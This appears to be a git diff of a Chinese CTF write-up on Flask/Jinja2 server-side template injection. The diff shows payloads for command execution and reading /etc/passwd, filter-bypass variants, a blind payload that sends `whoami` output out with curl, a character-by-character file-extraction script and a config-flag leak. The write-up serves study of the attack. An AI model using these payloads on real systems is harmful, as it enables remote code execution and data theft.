@@ -11,7 +11,9 @@ color: 'RGB(205,85,85)'
 #### 前言
 闲着刷攻防世界题目的时候遇到一个题目，打开一看可以明显感觉到是服务器模板注入（SSTI），对漏洞原理倒是了解，但是payload构造却难住了，搜索相关资料后做一个记录，加固理解并分享。
 
-#### 题目源码
+#### 题目源码 
+
+![image-20200603100040374.png](https://i.loli.net/2020/06/03/zCKdxMYfeaVuiQN.png)
 
 
 #### 服务端模板注入
@@ -70,24 +72,25 @@ object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read(
 request.__class__.__mro__.__getitem__(8)
 ```
 
-
 ##### 过滤引号
+
+![image-20200603100212175.png](https://i.loli.net/2020/06/03/rVdKZOpok5cPlSC.png)
 
 
 ##### 过滤双下划线
 
 ```
-{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
+\{\{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() \}\}&class=__class__&mro=__mro__&subclasses=__subclasses__
 ```
 
 ##### 过滤大括号
 
 ```
 利用标记
-{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
+\{\% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' \%\}1\{\% endif \%\}
 相当于盲命令执行，利用curl将执行结果带出来
 读取文件可以利用盲注的方法逐位将内容爆出来
-{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}
+\{\% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' \%\}~p0~\{\% endif \%\}
 使用盲注脚本修改一下即可
 # -*- coding: utf-8 -*-
 import requests
@@ -107,7 +110,7 @@ s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-.
 
 for i in xrange(0,100):
     for c in s:
-        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
+        payload = '\{\% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" \%\}~p0~\{\% endif \%\}'
         if check(payload):
             password += c
             break
@@ -121,22 +124,22 @@ flask 中内置的的变量函数
 
 ##### flask 中内置的的变量函数  
 ```
-config ：可以从模板中直接访问Flask当前的config对象：{{config.SQLALCHEMY_DATABASE_URL}}
+config ：可以从模板中直接访问Flask当前的config对象：\{\{config.SQLALCHEMY_DATABASE_URL\}\}
 
-request : 就是flask中代表当前请求的request对象 ， {{request.url}}
+request : 就是flask中代表当前请求的request对象 ， \{\{request.url\}\}
 
-session :为Flask的session对象 ,{{session.new}} True
+session :为Flask的session对象,\{\{session.new\}\} True
 
-g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出{{g.name}}
+g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出\{\{g.name\}\}
 
-url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，{{url_for('home')}} ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，{{url_for('post',post_id=1)}}
+url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，\{\{url_for('home')\}\} ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，\{\{url_for('post',post_id=1)\}\}
 
 get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使用get_flashed_message()函数取出他们并消费掉
 
 
-{%for message in get_flashed_messages()%}
-{{message}}
-{% endfor %}
+\{\%for message in get_flashed_messages()\%\}
+\{\{message\}\}
+\{\% endfor \%}
 ```
 
 ##### payload
@@ -144,7 +147,7 @@ get_flashed_messages():这个函数会返回之前在flask中通过flask（）�
 
 ```
 
-{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+\{\{get_flashed_messages.__globals__['current_app'].config['FLAG']\}\}
 
 ```
 
